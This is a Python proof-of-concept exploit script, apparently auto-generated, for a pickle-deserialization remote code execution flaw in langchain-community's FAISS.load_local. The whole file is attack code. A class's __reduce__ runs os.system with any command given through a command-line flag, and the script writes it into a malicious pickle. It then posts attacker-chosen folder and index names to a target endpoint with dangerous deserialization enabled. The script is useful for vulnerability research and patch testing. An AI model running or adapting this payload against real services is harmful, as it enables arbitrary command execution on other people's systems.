#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-016
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_28.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langchain-community-only RCE (CVE-like)
Vulnerability: pickle.load() in FAISS.load_local() with user-controlled path
Target: /tmp/langchain-community-only (simulated endpoint)
"""

import os
import sys
import pickle
import struct
import tempfile
import requests
import argparse
from pathlib import Path

# ============================================================
# CONFIGURATION
# ============================================================
TARGET_URL = "http://localhost:8080/api/v1/trigger"  # Change as needed
PAYLOAD_COMMAND = "touch /tmp/poc_success.txt"       # Benign by default

# ============================================================
# MALICIOUS PICKLE GENERATION
# ============================================================
class RCE:
    """Class that executes a command when unpickled."""
    def __reduce__(self):
        import os
        return (os.system, (PAYLOAD_COMMAND,))

def create_malicious_pickle(output_path: str, command: str = PAYLOAD_COMMAND):
    """
    Creates a pickle file that executes the given command upon deserialization.
    """
    global PAYLOAD_COMMAND
    PAYLOAD_COMMAND = command
    payload = RCE()
    with open(output_path, "wb") as f:
        pickle.dump(payload, f)
    print(f"[+] Malicious pickle created at: {output_path}")
    print(f"[+] Payload command: {command}")

# ============================================================
# EXPLOIT DELIVERY
# ============================================================
def send_exploit(target_url: str, folder_path: str, index_name: str):
    """
    Sends a POST request to the target endpoint with attacker-controlled
    folder_path and index_name parameters.
    """
    # The simulated endpoint expects JSON with 'folder_path' and 'index_name'
    payload = {
        "folder_path": folder_path,
        "index_name": index_name,
        "allow_dangerous_deserialization": True  # Developer must set this
    }
    print(f"[*] Sending exploit to {target_url}")
    print(f"[*] Payload: {payload}")
    try:
        resp = requests.post(target_url, json=payload, timeout=10)
        print(f"[*] Response status: {resp.status_code}")
        print(f"[*] Response body: {resp.text[:500]}")
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed. Is the target server running?")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out.")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)

# ============================================================
# MAIN
# ============================================================
def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community FAISS.load_local RCE"
    )
    parser.add_argument("--target", default=TARGET_URL,
                        help="Target URL (default: %(default)s)")
    parser.add_argument("--command", default=PAYLOAD_COMMAND,
                        help="Command to execute (default: %(default)s)")
    parser.add_argument("--folder-path", default=None,
                        help="Folder path on server to write pickle (optional)")
    parser.add_argument("--index-name", default="exploit",
                        help="Index name for pickle file (default: %(default)s)")
    args = parser.parse_args()

    # Step 1: Create malicious pickle in a temp directory
    with tempfile.TemporaryDirectory() as tmpdir:
        pickle_path = os.path.join(tmpdir, f"{args.index_name}.pkl")
        create_malicious_pickle(pickle_path, args.command)

        # Step 2: Determine folder_path on the target server
        # In a real scenario, the attacker would need to upload the pickle
        # to a location the server can read. For this PoC, we assume the
        # attacker can write to /tmp/ on the server (common in CTF/demo).
        # If --folder-path is provided, use it; otherwise use /tmp/
        folder_path = args.folder_path if args.folder_path else "/tmp/"

        # Step 3: Send exploit
        print(f"[*] Using folder_path: {folder_path}")
        print(f"[*] Using index_name: {args.index_name}")
        send_exploit(args.target, folder_path, args.index_name)

        # Step 4: Verify execution (optional)
        print("[*] If successful, the command should have executed on the server.")
        print(f"[*] Check for file /tmp/poc_success.txt (or your custom command result).")

if __name__ == "__main__":
    main()
